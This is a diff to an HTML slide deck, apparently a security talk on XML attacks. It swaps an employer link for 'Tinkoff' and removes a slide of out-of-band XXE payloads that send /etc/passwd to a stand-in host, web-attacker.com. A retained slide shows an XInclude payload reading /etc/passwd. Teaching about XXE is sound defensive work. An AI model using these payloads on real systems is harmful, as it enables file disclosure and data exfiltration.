@@ -23,7 +23,7 @@
 						<a href="https://t.me/zarix908">zarix908</a>
 					</div>
 					<div>
-						<a href="https://infinetwireless.com/about">Infinet wireless</a>
+						Tinkoff
 					</div>
 				</section>
 				<section>
@@ -335,20 +335,6 @@
 					<pre class="xml"><code data-trim data-noescape>
 					&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
 					&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
-					</code></pre>
-				</section>
-				<section>
-					<h2>exfiltrate data out-of-band</h2>
-					<pre class="xml"><code data-trim data-noescape>
-						&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-						&lt;!ENTITY % eval "&lt;!ENTITY &#x25; 
-						exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
-						%eval;
-						%exfiltrate;
-					</code></pre>
-					<pre class="xml"><code data-trim data-noescape>
-						&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
-						"http://web-attacker.com/malicious.dtd"&gtl; %xxe;]&gt;
 					</code></pre>
 				</section>
 				<section>
